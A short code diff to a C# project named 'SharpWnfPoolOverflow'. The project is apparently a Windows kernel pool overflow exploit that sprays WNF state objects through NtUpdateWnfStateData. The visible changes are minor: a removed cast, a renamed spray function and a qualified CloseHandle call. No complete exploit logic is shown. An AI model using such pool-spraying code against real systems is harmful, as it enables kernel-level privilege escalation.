@@ -72,7 +72,7 @@ namespace SharpWnfPoolOverflow
             int ntstatus = NativeMethods.NtUpdateWnfStateData(
                 in stateName,
                 buffer,
-                (uint)data.Length,
+                data.Length,
                 IntPtr.Zero,
                 IntPtr.Zero,
                 0,
@@ -183,8 +183,8 @@ namespace SharpWnfPoolOverflow
                 return;
             }
 
-            SprayWnfPool();
-            CloseHandle(hDevice);
+            SprayWnfObject();
+            NativeMethods.CloseHandle(hDevice);
         }
     }
 }
